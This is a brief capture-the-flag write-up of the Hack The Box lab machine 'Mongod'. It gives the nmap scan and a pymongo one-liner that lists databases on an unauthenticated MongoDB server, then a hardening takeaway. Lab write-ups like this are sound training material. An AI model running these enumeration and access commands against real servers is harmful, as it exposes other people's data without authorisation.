# Mongod

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 0) |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Techniques** | Unauthenticated MongoDB |

## Overview
A host running MongoDB with no authentication.

## Enumeration
```bash
nmap -sC -sV -p- -oN nmap.txt <TARGET_IP>
# 27017/tcp open  mongod
```

## Exploitation
```bash
# the modern mongosh refused to talk to this old (3.6) server, so I used pymongo<4:
python3 -c "import pymongo; c=pymongo.MongoClient('<TARGET_IP>',27017); \
print(c.list_database_names())"
# then enumerate the interesting db / collection and read the document
```

## Key Takeaway
Enable MongoDB authentication and bind to internal interfaces only.

## My note
The up-to-date `mongosh` client errored on wire-version against the box's old MongoDB.
Dropping to a matching older client (pymongo<4) is a good general lesson: version
mismatch on the client side can masquerade as "service not working."
